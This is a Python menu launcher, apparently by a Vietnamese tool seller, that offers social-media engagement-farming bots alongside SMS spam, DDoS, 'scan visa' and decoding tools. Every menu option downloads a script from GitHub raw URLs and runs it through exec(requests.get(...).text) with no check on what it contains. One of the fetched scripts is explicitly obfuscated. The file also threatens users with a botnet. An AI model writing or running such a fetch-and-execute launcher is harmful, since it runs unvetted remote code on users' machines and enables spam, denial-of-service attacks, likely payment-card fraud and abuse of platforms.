
den = '[1;90m'
luc = '[1;32m'
trang = '[1;37m'
red = '[1;31m'
vang = '[1;33m'
tim = '[1;35m'
lamd = '[1;34m'
lam = '[1;36m'

hong = '[1;95m'
xnhac = '[1;95m'
xduong = '[1;95m'
do = '[1;33m'
thanh_xau = trang + '' + lam + '[' + vang + 'vL' + lam + '] ' + trang + ' ' + luc
thanh_dep = trang + '' + lam + '[' + luc + 'vL' + lam + '] ' + trang + ' ' + luc
import requests
import json
import os
from sys import platform
from datetime import datetime
from time import sleep, strftime
import hashlib
import hmac
import uuid

try:
    from pystyle import Colors, Colorate
except ImportError:
    os.system('pip install pystyle')
    from pystyle import Colors, Colorate

banners = f"""      
                    ╭━━━━╮╭━━━━┳━━━┳━━━┳╮
                    ┃╭╮╭╮┃┃╭╮╭╮┃╭━╮┃╭━╮┃┃
                    ╰╯┃┃╰╯╰╯┃┃╰┫┃╱┃┃┃╱┃┃┃
                    ╱╱┃┃╭━━╮┃┃╱┃┃╱┃┃┃╱┃┃┃╱╭╮
                    ╱╱┃┃╰━━╯┃┃╱┃╰━╯┃╰━╯┃╰━╯┃
                    ╱╱╰╯╱╱╱╱╰╯╱╰━━━┻━━━┻━━━╯
                    
"""
thongtin = f"""
\033[1;36mNhận code tool theo yêu cầu
\033[1;35mTelegram:@thangdev
\033[1;95mCoder by Nguyen Duc Thang        		
"""

def vanlong(so):
    a = '────' * (so - 1) + '─'
    for i in range(len(a)):
        sleep(0.003)
    print(a)

def clear():
    if platform.startswith('linux'):
        os.system('clear')
    else:
        os.system('cls')

def banner():
    print('[0m', end='')
    clear()
    a = Colorate.Horizontal(Colors.blue_to_green, banners)
    print(a)
    print(thongtin)
    vanlong(17)

banner()
print("\033[1;39m   ╔═════════════════════╗")
print("\033[1;39m   ║ \033[1;34mTOOL Trao Đổi Sub \033[1;39m  ║ ")
print("\033[1;39m   ╚═════════════════════╝")
print("\033[38;5;155m      Nhập Số \033[1;36m[1.1] \033[38;5;204mTOOL TDS TIKTOK + TIKTOK NOW")
print("\033[38;5;155m      Nhập Số \033[1;36m[1.2] \033[38;5;204mTOOL AUTO TDS FACEBOOK ")
print("\033[38;5;155m      Nhập Số \033[1;36m[1.3] \033[38;5;204mTOOL AUTO TDS PAGE PRO5 ")

print("\033[1;39m   ╔═════════════════════╗")
print("\033[1;39m   ║ \033[1;34mTOOL Tương Tác Chéo\033[1;39m ║ ")
print("\033[1;39m   ╚═════════════════════╝")
print("\033[38;5;155m      Nhập Số \033[1;36m[2.1] \033[38;5;204mTOOL TTC PAGE PRO5")
print("\033[38;5;155m      Nhập Số \033[1;36m[2.2] \033[38;5;204mTOOL TTC FACEBOOK")
print("\033[38;5;155m      Nhập Số \033[1;36m[2.3] \033[38;5;204mTOOL TTC IG")


print("\033[1;39m   ╔══════════════╗")
print("\033[1;39m   ║ \033[1;34mTOOL GOLIKE\033[1;39m  ║ ")
print("\033[1;39m   ╚══════════════╝")
print("\033[38;5;155m      Nhập Số \033[1;36m[3.1] \033[38;5;204mTOOL GOLIKE TIKTOK \033[1;33m[AUTO]")
print("\033[38;5;155m      Nhập Số \033[1;36m[3.2] \033[38;5;204mTOOL GOLIKE TIKTOK \033[1;33m[BẤM TAY]")
print("\033[38;5;155m      Nhập Số \033[1;36m[3.3] \033[38;5;204mTOOL GOLIKE IG ")
print("\033[38;5;155m      Nhập Số \033[1;36m[3.4] \033[38;5;204mTOOL GOLIKE THREADS ")
print("\033[38;5;155m      Nhập Số \033[1;36m[3.5] \033[38;5;204mTOOL GOLIKE X ")



print("\033[1;39m   ╔═════════════════════════════╗")
print("\033[1;39m   ║ \033[1;34mTOOL LIÊN QUAN VỀ FACEBOOK\033[1;39m  ║ ")
print("\033[1;39m   ╚═════════════════════════════╝")
print("\033[38;5;155m      Nhập Số \033[1;36m[5.1] \033[38;5;204mTOOL REG PRO5")
print("\033[38;5;155m      Nhập Số \033[1;36m[5.2] \033[38;5;204mTOOL Nuôi")
print("\033[38;5;155m      Nhập Số \033[1;36m[5.3] \033[38;5;204mTOOL GET UID POST")
print("\033[38;5;155m      Nhập Số \033[1;36m[5.4] \033[38;5;204mTOOL BUFF SHARE")

print("\033[1;39m   ╔═════════════════════╗")
print("\033[1;39m   ║ \033[1;34mTOOL TIỆN ÍCH     \033[1;39m  ║ ")
print("\033[1;39m   ╚═════════════════════╝")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.1] \033[38;5;204mTOOL SPAM SMS")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.2] \033[38;5;204mTOOL DDOS")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.3] \033[38;5;204mTOOL DEC")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.4] \033[38;5;204mTOOL SCAN MAIL")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.5] \033[38;5;204mTOOL SCAN PROXY")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.6] \033[38;5;204mTOOL LỌC PROXY")
print("\033[38;5;155m      Nhập Số \033[1;36m[6.7] \033[38;5;204mTOOL SCAN VISA")




chon = float(input('\033[1;31m     Nhập Số \033[1;32m: \033[1;33m'))

import requests,os,sys, time
def check_internet_connection():
    try:
        response = requests.get("https://google.com/", timeout=5)
        return True
    except requests.ConnectionError:
        return False
if not check_internet_connection():
    print("\n\033[1;39mBạn bug 1 lần nữa sẽ bị dính botnet ngay nhé")
    sys.exit(1) 
if chon == 1.1 :
	exec(requests.get('https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/tdstiktok.py').text)

if chon == 1.2 :
	exec(requests.get('https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/tdsfb.py').text)
if chon == 1.3 :
	exec(requests.get('https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/tdspage.py').text)
if chon == 2.1 :
	exec(requests.get('https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/ttcpage.py').text)
	

if chon == 2.2 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/ttc.py').text)
if chon == 2.3 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/ttcig.py2.1').text)




if chon == 3.1 :
	exec(requests.get('https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/goliketiktokauto.py').text)
if chon == 3.2 :
	exec(requests.get('https://raw.githubusercontent.com/luvanlong01122007/luvanlong01122007/main/obf-golike.py').text)
if chon == 3.3 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/ig.py').text)
if chon == 3.4 :
	exec(requests.get('https://raw.githubusercontent.com/nguyenkkhihi/toolgop/refs/heads/main/golikeThegjkifderads.py').text)
if chon == 3.5 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/golikex.py').text)




if chon == 5.1 :
	exec(requests.get('github.com/Nguyenducthang1104/nguyenducthang/raw/refs/heads/main/regpro5.py').text)
if chon == 5.2 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/nuoi.py').text)
if chon == 5.3 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/get-post.py').text)
if chon == 5.4 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/share.py').text)
if chon == 6.1 :
	exec(requests.get('https://raw.githubusercontent.com/Khanh23047/Spamsmsv2/main/smsv2.py').text)
if chon == 6.2 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/ddos.py').text)
if chon == 6.3 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/dec.py').text)
if chon == 6.4 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/scanmail.py').text)
if chon == 6.5 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/scanproxy.py').text)
if chon == 6.6 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/locprx.py').text)
if chon == 6.7 :
	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/scanvisa.py').text)
else :
	exit()
